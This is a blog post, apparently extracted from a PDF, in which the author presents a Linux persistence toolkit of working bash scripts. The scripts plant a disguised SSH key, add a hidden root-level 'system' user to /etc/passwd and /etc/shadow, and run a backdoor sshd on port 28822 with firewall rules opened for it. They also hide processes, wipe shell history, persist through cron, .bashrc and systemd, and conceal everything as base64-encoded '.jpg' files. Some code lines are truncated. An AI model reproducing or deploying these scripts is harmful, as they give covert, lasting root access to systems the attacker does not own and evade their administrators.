Being\na guy who is fascinated with Offensive Security I felt that sharing everything that I worked\nhard on was like giving away my ammunition.\n\nHowever, I strongly feel that sharing my knowledge and my tricks have more benefits to the\nInfo Sec Community and myself.\n\nI also realized the restrains of blogging and only relaying on screenshots without being able\n[to show proof of concepts via videos. So I decided to go ahead and create a YouTube Channel](https://www.youtube.com/channel/UCvILbl6MnRv8FdTBiFPXaRw)\nwhere I will upload the videos.\n\nWhere possible at the bottom of each article I will attach a video demo.\n\nThese are my Advanced Persistence Threat (APT) tricks that I put together in order to\nachieve some level of persistence. These methods are not 100% undetectable but it may\nreserve you a backdoor into the system.\n\n[Before we move on please see /disclaimer/](https://flaviu.io/disclaimer/)\n\n## Requirements\n\nFirst and foremost I need to make sure that the system in question has all the requirements\ninstalled in order to execute all my scripts. The requirements differ from system to system\nbut I am being more broad to target the common linux distros.\n```\n                          #!/bin/bash\n                        apt=`which apt-get`\n                       if [[ -f $apt ]]; then\n                  apt-get -qq -y update >/dev/null 2>&1\n  apt-get -qq install cron -y ; apt-get -qq install net-tools -y ; apt-get -qq install systemd\n                             -y\n                 which crontab;which netstat;which systemd\n                 echo -e \"\\e[31mInstalled with apt-get\\e[0m\"\n                            else\n                         yum -q update -y\n      yum -q install systemd -y ; yum -q install cron -y;yum -q install net-tools -y\n                 which crontab;which netstat;which systemd\n                  echo -e \"\\e[31mInstalled with yum\\e[0m\"\n                             fi\n\n```\nBash\nI'n going to call this script requirements.sh for the time being.\n\n\n-----\n\nWith an if-else statement I am checking if the system is using apt or yum.\n\n**Advanced Package Tool also know as APT works with libraries to handle the installation**\nand removal of packages.\n\n**Yellowdog Updater also known as YUM is a command line package manager utility for**\nLinux operating systems commonly found on CentOS/RHEL distributions.\n\nWhere needed, I installed cron, net-tools, and systemd.\n\nUsers that set up and maintain software use Cron to schedule jobs that are running\nperiodically at fixed intervals.\n\n**Cron and Crontab**\n\nThe name of the tool is Cron and Crontab is the binary that will print the jobs that cron is\nexecuting.\n\nThe Net-tools package is made up of programs which form the base of Linux networking.\n\n**Systemd is a Linux service manager that includes features like on-demand starting of**\ndaemons, mount and automount point maintenance, and processes tracking.\n\nI like to encode my scripts, so below is a version of the initial script that undergone simple\nb64 encoding and had a file format change.\n```\n                          #!/bin/bash\n                            echo\n \"IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUgSElTVFNBVkUgSElTVE1PVkUgSElTVFpPTkUgSElTVE9SWSBISVNUTE9HI\n    | base64 --decode > /tmp/req.jpg;chmod +x /tmp/req.jpg;/tmp/req.jpg;rm -rf tmp/req.jpg\n                      echo -e \"\\e[31mDone\\e[0m\"\n\n```\nBash\nMy final script called requirements.jpg\n\nIn case you are wondering why I'm using .JPG format, is just something I prefer. I want to\ncamouflage myself as much as possible in the event \"someone\" finds my files. Using jpg, gif\nor other unsuspicious formats, file names and output folders might trick the\n\"person\" into believing it is not something malicious.\n\n## Persistence\n\nThis is the main script that does most of the work.\n\n\n-----\n\n```\n          if [ -z \"${HOME:-}\" ]; then export HOME=\"$(cd ~ && pwd)\"; fi\n                        uid=$(id -u)\n              if [ -n \"${uid}\" ] && [ $uid -ge \"0\" ] ; then\n                         admin_port=28822\n                     administration_key='ssh-rsa\nAAAAB3NzaC1yc2EAAAABJQAAAQEAu6QWR15HphWLI/0MsKbDm82diJJnRJQMwwHneoMA9mlrUxQ/9EJQtcvAEWDYjvnCBI\n                system key generated by server 20150113'\nlocateUser='system:$6$zA6e8KqHElNiaBv7$gHry0K8nRfUDzyxfW/C0sFGpJjwAtcaiO/RpfWzOow14BO1pATPXhtb\n                        inFile='/etc/shadow'\n                lUName='system:x:0:0:system:/root:/bin/bash'\n                        uNFile='/etc/passwd'\n                       dir_ssh='/root/.ssh/'\n                  dir_ssh_k=\"${dir_ssh}authorized_keys\"\n                      bashFfile=\"/root/.bashrc\"\n               bashSecLine=\"/etc/syslogservice >/dev/null 2>&1\"\n              node_process_id=`netstat -nptl |grep \":$admin_port\"`\n          banned=\"sshd -p $admin_port|inject|./sshd:|bing|resolve|system@\"\n                        ufwFile=`which ufw`\n                       fIptbl=`which iptables`\n                   if [[ -z $node_process_id ]]; then\n                         sshd_file=`which sshd`\n                         $sshd_file -p 28822 &\n                             sleep 9s\n                             fi\n                      if [[ -f $ufwFile ]]; then\n          checkUpdatePort=`$ufwFile status | grep $admin_port | grep -iF \"allow\"`\n                     if [[ -z $checkUpdatePort ]]; then\n                         $ufwFile allow $admin_port\n                               fi\n                             fi\n      for pid in $(ps -fe | egrep \"$banned\" | egrep -v 'grep' | awk '{print $2}'); do\n                      mount -o bind ~/ /proc/$pid\n                            done\n                      if [[ -f $fIptbl ]]; then\n        check_upgrade_port=`iptables-save | grep -- \"-A INPUT -p tcp -m tcp --dport\n                     $admin_port -j ACCEPT\"`\n                    if [[ -z $check_upgrade_port ]]; then\n                 iptables -A INPUT -p tcp --dport $admin_port -j ACCEPT\n                               fi\n                             fi\n    outc=$(unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST\n        REMOTEUSER WATCH;history -n;export HISTFILE=/dev/null; history -c)\n                      if [[ -d $dir_ssh ]]; then\n                        echo \"\" >/dev/null &\n                            else\n                    mkdir $dir_ssh >/dev/null 2>&1\n                            fi\n                    if [[ -f $dir_ssh_k ]]; then\n                        echo \"\" >/dev/null &\n                            else\n                    touch $dir_ssh_k >/dev/null 2>&1\n                            fi\n    grep -qF -- \"${administration_key}\" \"${dir_ssh_k}\" || echo \"${administration_key}\" >>\n                        \"${dir_ssh_k}\"\n    grep -qF -- \"$locateUser\" \"$inFile\" || grep -qF -- \"$locateUser\" \"$inFile\" || sed -i\n                           '2\ni\\system:$6$zA6e8KqHElNiaBv7$gHry0K8nRfUDzyxfW/C0sFGpJjwAtcaiO/RpfWzOow14BO1pATPXhtbb764YLxaEn\n                         /etc/shadow\n\n```\n\n-----\n\n```\n        g p q $ $ || g p q $ $ ||\n              i\\system:x:0:0:system:/root:/bin/bash' /etc/passwd\n        grep -qF -- \"$bashSecLine\" \"$bashFfile\" || echo \"$bashSecLine\" >> \"$bashFfile\"\n         sed -i '/^PermitRootLogin/s/no/yes/' /etc/ssh/sshd_config >/dev/null 2>&1\n          sed -i '/^PrintLastLog/s/yes/no/' /etc/ssh/sshd_config >/dev/null 2>&1\n                             fi\n\n```\nBash\nScript syslog.sh\n\nTo briefly explain what is happening in this script, This script is purposely made for being\nexecuted into a system where I would be root. I have created different scripts for systems\nwhere I have limited access but still want some form of persistence, I will get into that further\nalong.\n\nVariables: admin_port, administration_key, locateUser, inFile, lUName, uNFile, dir_ssh,\ndir_ssh_k, bashFfile, bashSecLine, node_process_id, banned, ufwFile, fIptbl.\n\nCloning the ssh port apart from the default one weather it is 22 or the admin has changed\nthis to 2222, my new port will be 28822.\n\nI am using authorized_keys and placing my own key into the .ssh folder (/root/.ssh/), this\nkey is crafted to look like it was generated by the server itself to blend in. I am also adding a\nnew user called \"system\" with admin privileges, and this user will be placed right underneath\nthe root user. By default new users are wrote at the bottom of passwd and shadow files but I\nthink by moving it at the top it would be harder to spot.\n\nThis script will be put into /etc/syslogservice.\n\nThe script is also making sure that my new ssh backdoor port will be allowed in the system\nvia ufw and iptables, also adding a new entry in .bashrc.\n\n**.bashrc initializes an interactive shell session, Any command that is being put in this file is**\nexecuted whenever a new terminal session is opened.\n\nI am making use of grep, sed, and echo with the other variables in my script to help me along\nthe way in injecting code in places where I want them to be (e.g changing PermitRootLogin\nfrom no to yes in sshd_config).\n\nAgain as with the previous script this will one undergo encoding.\n\n\n-----\n\n```\n   unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER\n           WATCH;history -n;export HISTFILE=/dev/null; history -c;echo\n \"IyEvYmluL2Jhc2gKaWYgWyAteiAiJHtIT01FOi19IiBdOyB0aGVuIGV4cG9ydCBIT01FPSIkKGNkIH4gJiYgcHdkKSI7I\n    | base64 --decode > /etc/syslogservice;echo \"/etc/syslogservice >/dev/null 2>&1\" >>\n      /root/.bashrc; source .bashrc;mkdir /root/.ssh;cd /root/.ssh;echo -e \"ssh-rsa\n AAAAB3NzaC1yc2EAAAABJQAAAQEAu6QWR15HphWLI/0MsKbDm82diJJnRJQMwwHneoMA9mlrUxQ/9EJQtcvAEWDYjvnCBI\n   system key generated by server 20150113\\n$(<authorized_keys)\" > authorized_keys;chmod 400\n   authorized_keys;chown root:root /root/.ssh;chown root:root /etc/syslogservice; chmod 755\n               /etc/syslogservice;chattr +i /etc/syslogservice\n\n```\nBash\nFinal script syslog.jpg\n\nThe command `chown root:root changes the user and group of the specified file or`\ndirectory to user `root and group` `root .`\n\nMore importantly chattr, this is the command in the GNU system that allows a user to set\ncertain attributes of a file.\n\ndemo chattr\n\nI am doing this because I don't want my file being edited or removed from the system. As you\ncan see even with administrative privileges I cannot change, remove or edit the file.\n\n## Cron job\n\n\n-----\n\n```\n#!/bin/bash\ncroncmd=\"/etc/syslogservice >/dev/null 2>&1\"\ncronjob=\"10 * * * * $croncmd\"\n( crontab -l | grep -v -F \"$croncmd\" ;echo -e \"$cronjob\") | crontab echo -e \"\\e[31mHere is the crontab running:\\e[0m\"\ncrontab -l\n\n```\nBash\n\nIn a `crontab file, the fields are:`\n\nminute of the hour.\nhour of the day.\nday of the month.\nmonth of the year.\nday of the week.\n\nIn my case\n```\n10 * * * * /etc/syslogservice >/dev/null 2>&1\n\n```\nBash\n\nIt means execute `syslogservice at 10 minutes past every hour.`\n\nEncoding the cron script below.\n```\n                          #!/bin/bash\n   unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER\n             WATCH;history -n;export HISTFILE=/dev/null; history -c\n                            echo\n \"IyEvYmluL2Jhc2gKY3JvbmNtZD0iL2V0Yy9zeXNsb2dzZXJ2aWNlID4vZGV2L251bGwgMj4mMSIKY3JvbmpvYj0iNSAqI\n  | base64 --decode > /etc/cron.jpg;chmod +x /etc/cron.jpg;/etc/cron.jpg;rm -rf /etc/cron.jpg\n                      echo -e \"\\e[31mDone\\e[0m\"\n\n```\nBash\ncron.jpg\n\n## System Hardening\n\nThe next thing I want to do is also beneficial to the \"system that has been compromised\",\nWhat.. ? Putting my whitehat on...\n\nI would not like other hackers to \"compromise\" the same systems that \"I did\". So I am going\nto harden the system by installing fail2ban to block other ssh attempts, I would have a look in\nthe system to get a feel of what is it being used for, update all the packages, check the system\nfor weak passwords, and basically and way of someone else getting in. (Being selfish am I ?)\n\n\n-----\n\n```\n                        apt=`which apt-get`\n                       if [[ -f $apt ]]; then\n                  apt-get -qq -y update >/dev/null 2>&1\n               apt-get -qq install fail2ban -y >/dev/null 2>&1\n                         which fail2ban\n                 echo -e \"\\e[31mInstalled via apt-get\\e[0m\"\n                            else\n                    yum -q update -y >/dev/null 2>&1\n                 yum -q install fail2ban -y >/dev/null 2>&1\n                         which fail2ban\n                  echo -e \"\\e[31mInstalled via yum\\e[0m\"\n                             fi\n                  echo -e \"\\e[31mCreating jail file\\e[0m\"\n                    touch /etc/fail2ban/jail.local\n        echo \"[DEFAULT] ignoreip = 127.0.0.1/8 ::1\" >> /etc/fail2ban/jail.local\n               echo \"bantime = 3600\" >> /etc/fail2ban/jail.local\n               echo \"findtime = 600\" >> /etc/fail2ban/jail.local\n               echo \"maxretry = 2\" >> /etc/fail2ban/jail.local\n             echo \"[sshd] enabled = true\" >> /etc/fail2ban/jail.local\n                    echo -e \"\\e[31mRestarting\\e[0m\"\n                      service fail2ban restart\n                   echo -e \"\\e[31mChecking Status\\e[0m\"\n                       service fail2ban status\n\n```\nBash\ninstalling fail2ban\n\nFail2ban is an framework that prevents intrusion, it protects systems from brute force attacks.\n\nUsing a simple if / else statement I am installing fail2ban and creating the jail file for the ssh\nprotocol.\n\nI can also configure Fail2Ban to monitor Apache or Nginx logs. There are many 'jails'\ntemplates that I could include in my script but for the purpose of this demo I am only\ncreating a jail for the ssh protocol. Below are other jails and what they being used for.\n```\n[apache-noscript] jail is used to ban clients that are looking for scripts on the webpage to\n\n```\nexecute and exploit.\n\nThe `[apache-overflows] jail is used to restrict access to client who are trying to request`\nsuspicious URLs. These can often be signs of attempts from attackers that are trying to\nexploit your webserver by triggering buffer overflows.\n\nOther additional jails are `apache-badbots, this is used to stop known malicious bots.`\n\nLastly, if you are running apache with php, you may need to enable the `[php-url-fopen]`\njail, this blocks attempts for usage of specific php behavior for malicious purposes. You are\nmost likely going to need to change the `logpath directory to point to the correct access log`\nlocation e.g in Ubuntu the location is at `/var/log/apache2/access.log .`\n\nEncoding the fail2ban script:\n\n\n-----\n\n```\n                            echo\n \"IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUgSElTVFNBVkUgSElTVE1PVkUgSElTVFpPTkUgSElTVE9SWSBISVNUTE9HI\n    | base64 --decode > /tmp/fail2ban.jpg;chmod +x /tmp/fail2ban.jpg;/tmp/fail2ban;rm -rf\n                        /tmp/fail2ban.jpg\n                      echo -e \"\\e[31mDone\\e[0m\"\n\n```\nBash\nFinal script fail2ban.jpg\n\n## Systemd Service\n\nIn this script I have also added a fail2ban service, This is just a timer that makes sure that\nfail2ban is always running.\n\nSystemd are unit files whose name are ending in .service.

This is usually not what I\nwant for a service that must be always running, so I'm instructing it to always restart on exit.\n\nRestartSec=3600\nI could also use on-failure to only restart if the exit status is not 0.\nBy default, systemd attempts a restart after 100ms. I can specify the number of seconds to\nwait before attempting a restart.\n\n\n-----\n\nIt is useful to note: By default when I configured Restart=always, systemd will give up\nrestarting my service (Forever) if it fails to start it in 5 attempts within 10 seconds.\nThe units that are responsable for this are\nStartLimitBurst=5\nStartLimitIntervalSec=10\n\nThe RestartSec parameter will also have an impact, for example if it is set to restart within 3\nseconds then I cannot reach 5 failed tries within 10 seconds, right? right.\nThe easiest fix will be to set StartLimitIntervalSec=0, this means that systemd will attempt to\nstart the service forever.\nAs an alternative, by leaving the default settings, I can tell systemd to restart the service if the\nstart limit is reached by using StartLimitAction=reboot.\n\nEncoding syslogservice service:\n```\n                          #!/bin/bash\n   unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER\n             WATCH;history -n;export HISTFILE=/dev/null; history -c\n                            echo\n \"CltVbml0XQpEZXNjcmlwdGlvbj1TeXNMb2dTZXJ2aWNlCkFmdGVyPW5ldHdvcmstb25saW5lLnRhcmdldApSZXF1aXJlc\n        | base64 --decode > /etc/systemd/system/cleaning.service;systemctl start\n              cleaning.service;systemctl enable cleaning.service\n                      echo -e \"\\e[31mDone\\e[0m\"\n\n```\nBash\nFinal script syslogservice.jpg\n\nSo far I've gone through the following scripts:\n\nrequirements.jpg\nsyslog.jpg\ncron.jpg\nfail2ban.jpg\nfail2ban-service.jpg\nsyslogservice.jpg\n\nUsing tar and assuming these files are within a folder I can pack them all into 1 single file.\n\ntar czvf unix.jpg *\n\n\n-----\n\nadding all the scripts into a single file\n\n## Demo\n\nWatch Video At: https://youtu.be/8rDcYk4yyNA\n\nConclusion:\n\nI like keeping persistance through light scripts and not rootkits that are potentially detected\nby AV's or by other scanners because they infect a lot of /bin files. See my previous post at\n[have-i-been-hacked to read where I talk about rkhunter, chkrootkit.](https://flaviu.io/linux-have-i-been-hacked/)\n\nThis blog post is informative for both communities, Offensive and Defensive as it shows a\ntiny glimpse into the world of hide and seek.\n\nRoom for improvement? Sure there is! This is just a warm-up!\n\n\n-----\n\nThe idea is to blend in the system as much as possible, stay hidden and quiet for as long as\npossible.\n\nTo do: inject a sneaky web shell in the web server that would get me a simple shell.\n\n[Have you got suggestions for improvement ?
